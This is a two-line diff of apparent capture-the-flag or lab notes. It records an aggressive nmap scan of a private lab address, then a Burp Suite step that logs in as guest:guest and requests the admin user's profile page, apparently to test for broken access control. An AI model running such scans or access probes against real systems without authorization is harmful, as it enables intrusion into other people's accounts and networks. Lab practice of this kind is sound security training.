@@ -1,0 +1,2 @@
+1 - nmap -A 10.10.9.91
+2 - Burp Suite -> Login guest:guest -> GET /profile.php?user=admin HTTP/1.1
